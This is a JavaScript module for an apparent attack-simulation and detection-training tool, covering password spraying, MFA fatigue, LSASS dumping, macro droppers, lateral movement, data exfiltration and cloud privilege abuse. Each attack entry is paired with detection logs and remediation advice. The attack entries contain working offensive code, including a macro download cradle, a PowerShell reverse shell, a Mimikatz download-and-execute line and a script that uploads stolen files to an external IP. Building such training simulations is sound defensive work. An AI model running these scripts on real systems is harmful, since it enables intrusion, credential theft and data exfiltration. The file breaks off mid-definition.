// Attack Simulation Engine - Enhanced Version
// Generates realistic security events with detailed scripts and commands

import { v4 as uuidv4 } from './utils.js';

// Detailed attack scripts and commands for each scenario
const ATTACK_SCRIPTS = {
  'password-spray': {
    reconnaissance: [
      { type: 'command', tool: 'nmap', command: 'nmap -sV -p 443,80 mail.contoso.com', output: 'PORT    STATE SERVICE\n80/tcp  open  http\n443/tcp open  https  Microsoft-IIS/10.0' },
      { type: 'command', tool: 'dig', command: 'dig +short MX contoso.com', output: 'contoso-com.mail.protection.outlook.com' },
      { type: 'info', message: 'Target identified: Microsoft 365 tenant' },
    ],
    execution: [
      { type: 'script', language: 'powershell', name: 'Spray-Passwords.ps1', code: `# Password Spray Attack Script
$users = @(
    "alice@contoso.com",
    "bob@contoso.com", 
    "carol@contoso.com",
    "david@contoso.com",
    "erin@contoso.com"
)

$passwords = @("Spring2024!", "Welcome1!", "Password123")

foreach ($password in $passwords) {
    foreach ($user in $users) {
        try {
            $secpass = ConvertTo-SecureString $password -AsPlainText -Force
            $cred = New-Object System.Management.Automation.PSCredential($user, $secpass)
            Connect-AzureAD -Credential $cred -ErrorAction Stop
            Write-Host "[+] SUCCESS: $user : $password" -ForegroundColor Green
        } catch {
            Write-Host "[-] FAILED: $user : $password" -ForegroundColor Red
        }
        Start-Sleep -Seconds 2  # Avoid rate limiting
    }
}` },
      { type: 'output', stream: 'stdout', content: '[-] FAILED: alice@contoso.com : Spring2024!\n[-] FAILED: bob@contoso.com : Spring2024!\n[-] FAILED: carol@contoso.com : Spring2024!' },
    ],
    detection: [
      { type: 'log', source: 'SigninLogs', raw: `{"TimeGenerated":"2024-01-10T10:00:00Z","UserPrincipalName":"alice@contoso.com","IPAddress":"45.155.205.233","ResultType":"50126","ResultDescription":"Invalid username or password","AppDisplayName":"Azure Active Directory PowerShell","ClientAppUsed":"Browser","Location":"RU"}` },
      { type: 'alert', name: 'Password Spray Attack Detected', severity: 'High' },
    ],
  },
  
  'mfa-fatigue': {
    reconnaissance: [
      { type: 'info', message: 'Credentials obtained from dark web marketplace' },
      { type: 'command', tool: 'curl', command: 'curl -X POST https://login.microsoftonline.com/contoso.com/oauth2/token -d "username=erin@contoso.com&password=Str0ngP@ss!"', output: '{"error":"interaction_required","error_description":"MFA required"}' },
    ],
    execution: [
      { type: 'script', language: 'python', name: 'mfa_bomber.py', code: `#!/usr/bin/env python3
# MFA Fatigue Attack - Push Notification Bomber

import requests
import time
from datetime import datetime

TARGET = "erin@contoso.com"
PASSWORD = "Str0ngP@ss!"  # Obtained from credential dump

def send_mfa_push():
    """Trigger MFA push notification"""
    session = requests.Session()
    
    # Initial auth to trigger MFA
    auth_url = "https://login.microsoftonline.com/contoso.com/oauth2/token"
    data = {
        "grant_type": "password",
        "username": TARGET,
        "password": PASSWORD,
        "resource": "https://graph.microsoft.com"
    }
    
    response = session.post(auth_url, data=data)
    return "interaction_required" in response.text

print(f"[*] Starting MFA fatigue attack against {TARGET}")
print(f"[*] Time: {datetime.now()}")

attempt = 0
while True:
    attempt += 1
    print(f"[{attempt}] Sending MFA push notification...")
    send_mfa_push()
    time.sleep(30)  # Wait 30 seconds between pushes
    
    if attempt >= 50:
        print("[!] Maximum attempts reached")
        break` },
      { type: 'output', stream: 'stdout', content: '[*] Starting MFA fatigue attack against erin@contoso.com\n[1] Sending MFA push notification...\n[2] Sending MFA push notification...\n[3] Sending MFA push notification...\n[4] Sending MFA push notification...\n[5] Sending MFA push notification...' },
    ],
    detection: [
      { type: 'log', source: 'SigninLogs', raw: `{"TimeGenerated":"2024-01-10T12:05:00Z","UserPrincipalName":"erin@contoso.com","IPAddress":"192.0.2.44","ResultType":"500121","AuthenticationDetails":[{"authenticationMethod":"Microsoft Authenticator","authenticationStepResultDetail":"MFA denied; user declined the authentication"}]}` },
      { type: 'alert', name: 'MFA Fatigue Attack Detected', severity: 'High' },
    ],
  },

  'lsass-dump': {
    reconnaissance: [
      { type: 'command', tool: 'whoami', command: 'whoami /priv', output: 'PRIVILEGES INFORMATION\n----------------------\nSeDebugPrivilege              Enabled\nSeImpersonatePrivilege        Enabled' },
      { type: 'command', tool: 'tasklist', command: 'tasklist /FI "IMAGENAME eq lsass.exe"', output: 'Image Name                     PID\n========================= ========\nlsass.exe                      672' },
    ],
    execution: [
      { type: 'script', language: 'powershell', name: 'Invoke-Mimikatz.ps1', code: `# LSASS Memory Dump using multiple techniques

# Method 1: ProcDump (Sysinternals)
Write-Host "[*] Attempting ProcDump method..."
$procdumpPath = "C:\\Tools\\procdump64.exe"
& $procdumpPath -ma lsass.exe lsass.dmp -accepteula

# Method 2: comsvcs.dll (Living off the Land)
Write-Host "[*] Attempting comsvcs.dll method..."
$lsassPID = (Get-Process lsass).Id
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPID C:\\Temp\\lsass.dmp full

# Method 3: Direct memory access with Mimikatz
Write-Host "[*] Loading Mimikatz..."
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/main/data/module_source/credentials/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'` },
      { type: 'output', stream: 'stdout', content: `[*] Attempting ProcDump method...
ProcDump v11.0 - Sysinternals process dump utility
Writing dump file C:\\Temp\\lsass.dmp...
Dump 1 complete

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WORKSTATION-01$
Domain            : CONTOSO
Logon Server      : DC01
Logon Time        : 1/10/2024 8:00:00 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CONTOSO
         * NTLM     : aad3b435b51404eeaad3b435b51404ee
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709` },
    ],
    detection: [
      { type: 'log', source: 'DeviceProcessEvents', raw: `{"TimeGenerated":"2024-01-10T08:15:00Z","DeviceName":"WORKSTATION-01","FileName":"procdump64.exe","ProcessCommandLine":"procdump64.exe -ma lsass.exe lsass.dmp -accepteula","InitiatingProcessFileName":"powershell.exe","AccountName":"jsmith"}` },
      { type: 'alert', name: 'Credential Dumping via LSASS Access', severity: 'Critical' },
    ],
  },

  'encoded-powershell': {
    reconnaissance: [
      { type: 'info', message: 'Phishing email delivered with malicious macro' },
      { type: 'command', tool: 'macro', command: 'Document_Open() macro executed', output: 'Shell command triggered' },
    ],
    execution: [
      { type: 'script', language: 'vba', name: 'Malicious Macro', code: `' Malicious Word Macro - Document_Open
Sub Document_Open()
    Dim cmd As String
    
    ' Base64 encoded PowerShell payload
    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc "
    cmd = cmd & "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZ" & _
                "QBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAa" & _
                "QBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAL" & _
                "gAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
    
    Shell cmd, vbHide
End Sub` },
      { type: 'script', language: 'powershell', name: 'Decoded Payload', code: `# Decoded Base64 payload
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')

# payload.ps1 contents:
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}` },
      { type: 'output', stream: 'network', content: 'Reverse shell connection established to 192.168.1.100:4444\nC2 beacon registered' },
    ],
    detection: [
      { type: 'log', source: 'DeviceProcessEvents', raw: `{"TimeGenerated":"2024-01-10T09:30:00Z","DeviceName":"LAPTOP-DEV-03","FileName":"powershell.exe","ProcessCommandLine":"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAo...","InitiatingProcessFileName":"WINWORD.EXE","AccountName":"mwilson"}` },
      { type: 'alert', name: 'Suspicious PowerShell Encoded Command', severity: 'High' },
    ],
  },

  'lateral-movement': {
    reconnaissance: [
      { type: 'command', tool: 'net', command: 'net view /domain', output: 'Server Name            Remark\n------------------------------------\n\\\\DC01                 Domain Controller\n\\\\SERVER-SQL01         SQL Server\n\\\\SERVER-FILE01        File Server' },
      { type: 'command', tool: 'nltest', command: 'nltest /dclist:contoso.com', output: 'Get list of DCs in domain "contoso.com" from "\\\\DC01"\n    DC01.contoso.com [PDC] [DS]' },
    ],
    execution: [
      { type: 'script', language: 'powershell', name: 'Invoke-LateralMovement.ps1', code: `# Lateral Movement via WMI and PsExec

$cred = New-Object System.Management.Automation.PSCredential(
    "CONTOSO\\Administrator", 
    (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)
)

# Method 1: WMI Remote Process Creation
Write-Host "[*] Executing command via WMI on DC01..."
Invoke-WmiMethod -Class Win32_Process -Name Create \`
    -ArgumentList "cmd.exe /c whoami > C:\\temp\\output.txt" \`
    -ComputerName DC01 -Credential $cred

# Method 2: PsExec
Write-Host "[*] Establishing PsExec session to SERVER-SQL01..."
.\\PsExec.exe \\\\SERVER-SQL01 -u CONTOSO\\Administrator -p P@ssw0rd123! cmd.exe

# Method 3: WinRM/PowerShell Remoting
Write-Host "[*] Creating PowerShell session to SERVER-FILE01..."
$session = New-PSSession -ComputerName SERVER-FILE01 -Credential $cred
Invoke-Command -Session $session -ScriptBlock { hostname; whoami }` },
      { type: 'output', stream: 'stdout', content: `[*] Executing command via WMI on DC01...
ReturnValue: 0 (Success)

[*] Establishing PsExec session to SERVER-SQL01...
Microsoft Windows [Version 10.0.17763.1]
C:\\Windows\\system32> whoami
contoso\\administrator

[*] Creating PowerShell session to SERVER-FILE01...
SERVER-FILE01
contoso\\administrator` },
    ],
    detection: [
      { type: 'log', source: 'SecurityEvent', raw: `{"TimeGenerated":"2024-01-10T14:30:00Z","EventID":4624,"Computer":"DC01","LogonType":3,"TargetUserName":"Administrator","IpAddress":"10.0.0.15","LogonProcessName":"NtLmSsp"}` },
      { type: 'alert', name: 'Unusual RDP/SMB Lateral Movement', severity: 'High' },
    ],
  },

  'data-exfil': {
    reconnaissance: [
      { type: 'command', tool: 'dir', command: 'dir C:\\Users\\*\\Documents\\*.xlsx /s', output: 'Volume in drive C is OS\n Directory of C:\\Users\\CFO\\Documents\n01/10/2024  08:00 AM    12,345,678 Financial_Report_2024.xlsx\n01/10/2024  08:00 AM     5,678,901 Employee_Salaries.xlsx' },
      { type: 'command', tool: 'findstr', command: 'findstr /s /i "password secret key" C:\\Users\\*\\*.txt', output: 'C:\\Users\\Admin\\notes.txt:Database password: Pr0dDB_2024!' },
    ],
    execution: [
      { type: 'script', language: 'powershell', name: 'Exfiltrate-Data.ps1', code: `# Data Exfiltration Script

$stagingDir = "C:\\Temp\\staging"
$exfilServer = "45.155.205.233"
$exfilPort = 443

# Step 1: Collect sensitive files
Write-Host "[*] Collecting sensitive files..."
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

Get-ChildItem -Path "C:\\Users" -Recurse -Include *.xlsx,*.docx,*.pdf,*.pst -ErrorAction SilentlyContinue | 
    Where-Object { $_.Length -lt 50MB } |
    Copy-Item -Destination $stagingDir

# Step 2: Compress data
Write-Host "[*] Compressing data..."
$archivePath = "$stagingDir\\data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
Compress-Archive -Path "$stagingDir\\*" -DestinationPath $archivePath

# Step 3: Encrypt archive
Write-Host "[*] Encrypting archive..."
$key = [System.Text.Encoding]::UTF8.GetBytes("ExfilSecretKey!!")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key

# Step 4: Exfiltrate via HTTPS POST
Write-Host "[*] Exfiltrating to $exfilServer..."
$bytes = [System.IO.File]::ReadAllBytes($archivePath)
$base64 = [Convert]::ToBase64String($bytes)

Invoke-WebRequest -Uri "https://$exfilServer/upload" \`
    -Method POST \`
    -Body $base64 \`
    -ContentType "application/octet-stream"

Write-Host "[+] Exfiltration complete: $([math]::Round($bytes.Length/1MB, 2)) MB sent"` },
      { type: 'output', stream: 'stdout', content: `[*] Collecting sensitive files...
    - Financial_Report_2024.xlsx (12.3 MB)
    - Employee_Salaries.xlsx (5.7 MB)
    - Contracts_2024.pdf (45.2 MB)
    - outlook.pst (112.4 MB)
[*] Compressing data...
[*] Encrypting archive...
[*] Exfiltrating to 45.155.205.233...
[+] Exfiltration complete: 175.6 MB sent` },
    ],
    detection: [
      { type: 'log', source: 'CommonSecurityLog', raw: `{"TimeGenerated":"2024-01-10T16:00:00Z","SourceIP":"10.0.1.25","DestinationIP":"45.155.205.233","DestinationPort":443,"BytesSent":184123456,"ApplicationProtocol":"HTTPS","DeviceVendor":"Palo Alto Networks"}` },
      { type: 'alert', name: 'Unusual Outbound Data Volume to Rare Destination', severity: 'Critical' },
    ],
  },

  'service-principal-abuse': {
    reconnaissance: [
      { type: 'command', tool: 'az', command: 'az ad app list --query "[].{name:displayName,appId:appId}" -o table', output: 'Name                    AppId\n----------------------  ------------------------------------\nProd-API-App            12345678-1234-1234-1234-123456789012\nDev-Function-App        87654321-4321-4321-4321-210987654321' },
    ],
    execution: [
      { type: 'script', language: 'powershell', name: 'Create-MaliciousApp.ps1', code: `# Create Malicious Service Principal with Elevated Permissions

# Connect with compromised admin credentials
Connect-AzureAD -Credential $cred

# Step 1: Create new application
Write-Host "[*] Creating malicious application..."
$app = New-AzureADApplication -DisplayName "Azure-Backup-Service" \`
    -IdentifierUris "https://azure-backup-svc.contoso.com"

# Step 2: Create service principal
Write-Host "[*] Creating service principal..."
$sp = New-AzureADServicePrincipal -AppId $app.AppId

# Step 3: Add client secret (credential)
Write-Host "[*] Adding credentials..."
$startDate = Get-Date
$endDate = $startDate.AddYears(2)
$secret = New-AzureADApplicationPasswordCredential \`
    -ObjectId $app.ObjectId \`
    -StartDate $startDate \`
    -EndDate $endDate

# Step 4: Assign dangerous permissions
Write-Host "[*] Granting permissions..."
# Application.ReadWrite.All - Can modify any app
# Directory.ReadWrite.All - Full directory access
# Mail.Read - Read all mail

$requiredAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$requiredAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"  # Microsoft Graph
$requiredAccess.ResourceAccess = @(
    @{Id="1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9"; Type="Role"},  # Application.ReadWrite.All
    @{Id="19dbc75e-c2e2-444c-a770-ec69d8559fc7"; Type="Role"}   # Directory.ReadWrite.All
)

Set-AzureADApplication -ObjectId $app.ObjectId -RequiredResourceAccess $requiredAccess

Write-Host "[+] Malicious app created!"
Write-Host "    App ID: $($app.AppId)"
Write-Host "    Secret: $($secret.Value)"` },
      { type: 'output', stream: 'stdout', content: `[*] Creating malicious application...
[*] Creating service principal...
[*] Adding credentials...
[*] Granting permissions...
[+] Malicious app created!
    App ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
    Secret: Abc123~XyZ789_SecretCredential` },
    ],
    detection: [
      { type: 'log', source: 'AuditLogs', raw: `{"TimeGenerated":"2024-01-10T14:15:00Z","OperationName":"Add service principal credentials","InitiatedBy":{"user":{"userPrincipalName":"compromised-admin@contoso.com"}},"TargetResources":[{"type":"ServicePrincipal","displayName":"Azure-Backup-Service"}],"Result":"success"}` },
      { type: 'alert', name: 'Service Principal Creation with Credential Addition', severity: 'Critical' },
    ],
  },

  'keyvault-exfil': {
    reconnaissance: [
      { type: 'command', tool: 'az', command: 'az keyvault list --query "[].name" -o tsv', output: 'prod-secrets-kv\ndev-config-kv\nbackup-keys-kv' },
      { type: 'command', tool: 'az', command: 'az keyvault secret list --vault-name prod-secrets-kv --query "[].name" -o tsv', output: 'sql-connection-string\napi-master-key\nstorage-access-key\nservice-account-password' },
    ],
    execution: [
      { type: 'script', language: 'python', name: 'keyvault_exfil.py', code: `#!/usr/bin/env python3
# Azure Key Vault Secret Exfiltration

from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient
import json

# Use compromised service principal token
credential = DefaultAzureCredential()
vault_url = "https://prod-secrets-kv.vault.azure.net"

client = SecretClient(vault_url=vault_url, credential=credential)

print("[*] Enumerating Key Vault secrets...")
secrets = {}

for secret_properties in client.list_properties_of_secrets():
    secret_name = secret_properties.name
    print(f"[*] Retrieving: {secret_name}")
    
    secret = client.get_secret(secret_name)
    secrets[secret_name] = {
        "value": secret.value,
        "created": str(secret_properties.created_on),
        "expires": str(secret_properties.expires_on)
    }

# Save to file
with open("exfiltrated_secrets.json", "w") as f:
    json.dump(secrets, f, indent=2)

print(f"[+] Exfiltrated {len(secrets)} secrets!")` },
      { type: 'output', stream: 'stdout', content: `[*] Enumerating Key Vault secrets...
[*] Retrieving: sql-connection-string
[*] Retrieving: api-master-key
[*] Retrieving: storage-access-key
[*] Retrieving: service-account-password
[*] Retrieving: encryption-key-primary
[*] Retrieving: jwt-signing-secret
[+] Exfiltrated 6 secrets!` },
    ],
    detection: [
      { type: 'log', source: 'AzureDiagnostics', raw: `{"TimeGenerated":"2024-01-10T11:30:00Z","ResourceProvider":"MICROSOFT.KEYVAULT","OperationName":"SecretGet","CallerIPAddress":"45.155.205.233","identity_claim_upn_s":"malicious-sp@contoso.com","ResultType":"Success","properties_s":{"secretName":"api-master-key"}}` },
      { type: 'alert', name: 'Key Vault Secret Access Anomaly', severity: 'Critical' },
    ],
  },

  'impossible-travel': {
    reconnaissance: [
      { type: 'info', message: 'Attacker obtained credentials via credential stuffing' },
    ],
    execution: [
      { type: 'script', language: 'bash', name: 'vpn_hop_login.sh', code: `#!/bin/bash
# Login from multiple geographic locations using VPN hopping

# First login - New York VPN
echo "[*] Connecting to NYC VPN endpoint..."
openvpn --config nyc-vpn.ovpn --daemon
sleep 5
echo "[*] Logging into M365 from New York (IP: 198.51.100.23)..."
curl -X POST "https://login.microsoftonline.com/contoso.com/oauth2/token" \\
    -d "grant_type=password&username=dana@contoso.com&password=CompromisedPass123"

# Wait 15 minutes
sleep 900

# Second login - Tokyo VPN  
echo "[*] Connecting to Tokyo VPN endpoint..."
pkill openvpn
openvpn --config tokyo-vpn.ovpn --daemon
sleep 5
echo "[*] Logging into M365 from Tokyo (IP: 103.75.201.4)..."
curl -X POST "https://login.microsoftonline.com/contoso.com/oauth2/token" \\
    -d "grant_type=password&username=dana@contoso.com&password=CompromisedPass123"

echo "[+] Impossible travel scenario executed"
echo "    Distance: 10,800 km"
echo "    Time: 15 minutes"  
echo "    Required speed: 43,200 km/h (impossible)"` },
      { type: 'output', stream: 'stdout', content: `[*] Connecting to NYC VPN endpoint...
[*] Logging into M365 from New York (IP: 198.51.100.23)...
{"token_type":"Bearer","access_token":"eyJ0eXAi..."}

[*] Connecting to Tokyo VPN endpoint...
[*] Logging into M365 from Tokyo (IP: 103.75.201.4)...
{"token_type":"Bearer","access_token":"eyJ1eRAi..."}

[+] Impossible travel scenario executed
    Distance: 10,800 km
    Time: 15 minutes
    Required speed: 43,200 km/h (impossible)` },
    ],
    detection: [
      { type: 'log', source: 'SigninLogs', raw: `{"TimeGenerated":"2024-01-10T12:00:00Z","UserPrincipalName":"dana@contoso.com","IPAddress":"103.75.201.4","Location":"JP","RiskLevelDuringSignIn":"high","RiskState":"atRisk","RiskDetail":"impossibleTravel"}` },
      { type: 'alert', name: 'Entra ID Impossible Travel Sign-in', severity: 'Medium' },
    ],
  },

  'phishing-campaign': {
    reconnaissance: [
      { type: 'info', message: 'Attacker registered lookalike domain: micros0ft-security.com' },
      { type: 'command', tool: 'whois', command: 'whois micros0ft-security.com', output: 'Domain Name: micros0ft-security.com\nRegistrar: NameCheap\nCreated: 2024-01-09\nRegistrant: Privacy Protected' },
    ],
    execution: [
      { type: 'script', language: 'python', name: 'send_phishing.py', code: `#!/usr/bin/env python3
# Phishing Campaign Sender

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

TARGETS = [
    "alice@contoso.com",
    "bob@contoso.com", 
    "carol@contoso.com"
]

# Create malicious document
def create_maldoc():
    # Document with macro that downloads payload
    return open("Invoice_Dec2024.xlsm", "rb").read()

# HTML email body mimicking Microsoft
html_body = """
<html>
<body style="font-family: Segoe UI, sans-serif;">
<img src="https://micros0ft-security.com/logo.png" width="120">
<h2>Action Required: Verify Your Account</h2>
<p>We detected unusual sign-in activity on your Microsoft 365 account.</p>
<p>Please review the attached security report and verify your identity.</p>
<p>Best regards,<br>Microsoft Security Team</p>
</body>
</html>
"""

for target in TARGETS:
    msg = MIMEMultipart()
    msg['From'] = 'security@micros0ft-security.com'
    msg['To'] = target
    msg['Subject'] = 'Urgent: Security Alert - Action Required'
    
    msg.attach(MIMEText(html_body, 'html'))
    
    # Attach malicious document
    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(create_maldoc())
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', 
                         'attachment; filename="Invoice_Dec2024.xlsm"')
    msg.attach(attachment)
    
    print(f"[*] Sending phishing email to {target}...")
    # Send email...

print("[+] Phishing campaign sent to 3 targets")` },
      { type: 'output', stream: 'stdout', content: `[*] Sending phishing email to alice@contoso.com...
[*] Sending phishing email to bob@contoso.com...
[*] Sending phishing email to carol@contoso.com...
[+] Phishing campaign sent to 3 targets` },
    ],
    detection: [
      { type: 'log', source: 'EmailEvents', raw: `{"TimeGenerated":"2024-01-10T08:00:00Z","SenderFromAddress":"security@micros0ft-security.com","RecipientEmailAddress":"alice@contoso.com","Subject":"Urgent: Security Alert - Action Required","NetworkMessageId":"abc123","DeliveryAction":"Delivered"}` },
      { type: 'log', source: 'EmailAttachmentInfo', raw: `{"NetworkMessageId":"abc123","FileName":"Invoice_Dec2024.xlsm","FileType":"xlsm","SHA256":"a1b2c3d4e5f6...","ThreatTypes":"Malware"}` },
      { type: 'alert', name: 'Phishing Attachment Patterns', severity: 'High' },
    ],
  },

  'email-forwarding': {
    reconnaissance: [
      { type: 'info', message: 'Attacker compromised user account via password spray' },
    ],
    execution: [
      { type: 'script', language: 'powershell', name: 'Create-ForwardingRule.ps1', code: `# Create hidden inbox forwarding rule

# Connect to Exchange Online with stolen credentials
$cred = Get-Credential  # bob@contoso.com
Connect-ExchangeOnline -Credential $cred

# Method 1: Create inbox rule to forward all mail
New-InboxRule -Name "Security Audit" \`
    -ForwardTo "exfil@malicious-domain.com" \`
    -MarkAsRead $true \`
    -StopProcessingRules $true

# Method 2: Set forwarding SMTP address (more stealthy)
Set-Mailbox -Identity bob@contoso.com \`
    -ForwardingSmtpAddress "smtp:bob.backup@gmail.com" \`
    -DeliverToMailboxAndForward $true

# Method 3: Create transport rule (if admin)
New-TransportRule -Name "Backup All Mail" \`
    -BlindCopyTo "collector@attacker.com" \`
    -SentToScope "InOrganization"

Write-Host "[+] Email forwarding configured successfully"
Write-Host "    All emails will be forwarded to: exfil@malicious-domain.com"` },
      { type: 'output', stream: 'stdout', content: `[+] Email forwarding configured successfully
    Inbox Rule: "Security Audit" 
    Forward To: exfil@malicious-domain.com
    Mark As Read: True (hide from victim)` },
    ],
    detection: [
      { type: 'log', source: 'OfficeActivity', raw: `{"TimeGenerated":"2024-01-10T09:00:00Z","Operation":"New-InboxRule","UserId":"bob@contoso.com","ClientIP":"45.155.205.233","Parameters":[{"Name":"ForwardTo","Value":"exfil@malicious-domain.com"},{"Name":"Name","Value":"Security Audit"}]}` },
      { type: 'alert', name: 'Suspicious Inbox Rule External Forward', severity: 'High' },
    ],
  },

  'privilege-escalation': {
    reconnaissance: [
      { type: 'command', tool: 'az', command: 'az ad user list --filter "displayName eq \'Global Administrator\'" --query "[].userPrincipalName"', output: '[\n  "admin@contoso.com",\n  "breakglass@contoso.com"\n]' },
    ],
    execution: [
      { type: 'script', language: 'powershell', name: 'Add-GlobalAdmin.ps1', code: `# Privilege Escalation - Add user to Global Administrator role

# Connect with compromised Privileged Role Administrator account
Connect-AzureAD -Credential $compromisedAdminCred

# Get the Global Administrator role
$globalAdminRole = Get-AzureADDirectoryRole | 
    Where-Object { $_.DisplayName -eq "Global Administrator" }

# If role not activated, activate it
if (!$globalAdminRole) {
    $roleTemplate = Get-AzureADDirectoryRoleTemplate | 
        Where-Object { $_.DisplayName -eq "Global Administrator" }
    Enable-AzureADDirectoryRole -RoleTemplateId $roleTemplate.ObjectId
    $globalAdminRole = Get-AzureADDirectoryRole | 
        Where-Object { $_.DisplayName -eq "Global Administrator" }
}

# Get attacker's user object
$attackerUser = Get-AzureADUser -ObjectId "attacker@contoso.com"

# Add attacker to Global Administrator role
Add-AzureADDirectoryRoleMember \`
    -ObjectId $globalAdminRole.ObjectId \`
    -RefObjectId $attackerUser.ObjectId

Write-Host "[+] User added to Global Administrator role!"
Write-Host "    User: attacker@contoso.com"
Write-Host "    Role: Global Administrator"
Write-Host "    Full tenant compromise achieved."` },
      { type: 'output', stream: 'stdout', content: `[+] User added to Global Administrator role!
    User: attacker@contoso.com
    Role: Global Administrator
    Full tenant compromise achieved.
    
Next steps available:
- Access all mailboxes
- Modify conditional access policies
- Create new admin accounts
- Access all Azure resources
- Disable security logging` },
    ],
    detection: [
      { type: 'log', source: 'AuditLogs', raw: `{"TimeGenerated":"2024-01-10T15:00:00Z","OperationName":"Add member to role","InitiatedBy":{"user":{"userPrincipalName":"compromised-pra@contoso.com"}},"TargetResources":[{"type":"User","displayName":"attacker@contoso.com"},{"type":"Role","displayName":"Global Administrator"}],"Result":"success"}` },
      { type: 'alert', name: 'Entra ID Privileged Role Assignment', severity: 'Critical' },
    ],
  },
};

// Attack Scenarios with realistic event sequences
export const ATTACK_SCENARIOS = {
  passwordSpray: {
    id: 'password-spray',
    name: 'Password Spray Attack',
    description: 'Simulates an attacker attempting to compromise multiple accounts using common passwords from a single IP address',
    severity: 'High',
    tactics: ['Initial Access', 'Credential Access'],
    techniques: ['T1110.003'],
    duration: 35000,
    icon: '🔑',
    scripts: ATTACK_SCRIPTS['password-spray'],
    phases: [
      { name: 'Reconnaissance', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'Credential Testing', progress: 20, duration: 15000, scriptPhase: 'execution' },
      { name: 'Account Lockouts', progress: 60, duration: 5000 },
      { name: 'Detection', progress: 80, duration: 6000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 5000 },
    ],
    iocs: {
      ips: ['45.155.205.233'],
      techniques: ['T1110.003 - Password Spraying'],
      indicators: ['Multiple failed logins from single IP', 'Targeting 10+ accounts', 'Common password patterns']
    },
    remediation: [
      'Block source IP at firewall',
      'Force password reset for targeted accounts',
      'Enable smart lockout policies',
      'Implement conditional access with location restrictions'
    ]
  },
  mfaFatigue: {
    id: 'mfa-fatigue',
    name: 'MFA Fatigue Attack',
    description: 'Simulates an attacker bombarding a user with MFA push notifications until they accidentally approve',
    severity: 'High',
    tactics: ['Credential Access'],
    techniques: ['T1621'],
    duration: 30000,
    icon: '📱',
    scripts: ATTACK_SCRIPTS['mfa-fatigue'],
    phases: [
      { name: 'Credential Obtained', progress: 0, duration: 3000, scriptPhase: 'reconnaissance' },
      { name: 'MFA Bombing Started', progress: 15, duration: 12000, scriptPhase: 'execution' },
      { name: 'User Fatigue', progress: 50, duration: 8000 },
      { name: 'Detection', progress: 85, duration: 4000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 3000 },
    ],
    iocs: {
      ips: ['192.0.2.44'],
      techniques: ['T1621 - MFA Request Generation'],
      indicators: ['Multiple MFA denials', 'Rapid push notification attempts', 'Off-hours authentication attempts']
    },
    remediation: [
      'Enable number matching for MFA',
      'Contact user immediately',
      'Reset user credentials',
      'Review recent successful authentications'
    ]
  },
  impossibleTravel: {
    id: 'impossible-travel',
    name: 'Impossible Travel Detection',
    description: 'Detects logins from geographically impossible locations in a short time window',
    severity: 'Medium',
    tactics: ['Initial Access'],
    techniques: ['T1078.004'],
    duration: 25000,
    icon: '✈️',
    scripts: ATTACK_SCRIPTS['impossible-travel'],
    phases: [
      { name: 'Login from New York', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
      { name: 'VPN Hop to Tokyo', progress: 25, duration: 6000, scriptPhase: 'execution' },
      { name: 'Login from Tokyo', progress: 50, duration: 5000 },
      { name: 'Velocity Analysis', progress: 70, duration: 5000, scriptPhase: 'detection' },
      { name: 'Alert Generated', progress: 100, duration: 5000 },
    ],
    iocs: {
      ips: ['198.51.100.23', '103.75.201.4'],
      techniques: ['T1078.004 - Cloud Accounts'],
      indicators: ['Travel speed > 900 km/h', 'Multiple countries in 1 hour', 'VPN/proxy indicators']
    },
    remediation: [
      'Contact user to verify travel',
      'Review device and browser fingerprints',
      'Enforce location-based conditional access',
      'Enable continuous access evaluation'
    ]
  },
  servicePrincipalAbuse: {
    id: 'service-principal-abuse',
    name: 'Service Principal Abuse',
    description: 'Simulates malicious service principal creation and credential addition for persistence',
    severity: 'Critical',
    tactics: ['Persistence', 'Privilege Escalation'],
    techniques: ['T1136.003'],
    duration: 40000,
    icon: '🤖',
    scripts: ATTACK_SCRIPTS['service-principal-abuse'],
    phases: [
      { name: 'Initial Compromise', progress: 0, duration: 4000, scriptPhase: 'reconnaissance' },
